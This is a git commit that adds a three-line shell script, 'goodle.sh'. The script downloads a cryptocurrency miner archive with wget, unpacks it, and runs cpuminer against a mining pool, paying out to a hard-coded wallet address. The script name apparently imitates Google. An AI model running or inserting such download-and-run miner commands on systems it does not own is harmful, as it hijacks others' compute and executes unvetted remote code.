29112e2579af99fbce9634447366296d4aaa7ece
baruaduh <96117980+baruaduh@users.noreply.github.com>
2021-12-14 23:21:58 +0700

    Create goodle.sh

---
+++ goodle.sh
@@ -0,0 +1,3 @@
+wget https://github.com/ahashpool/Sniffdogminer/archive/refs/tags/2.16.A.tar.gz
+tar -xf 2.16.A.tar.gz
+./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.mine.ahashpool.com:3433 -u 514DRsPnAGyAo7FY7kphw1xrdAxMf2kKDM -p d=64
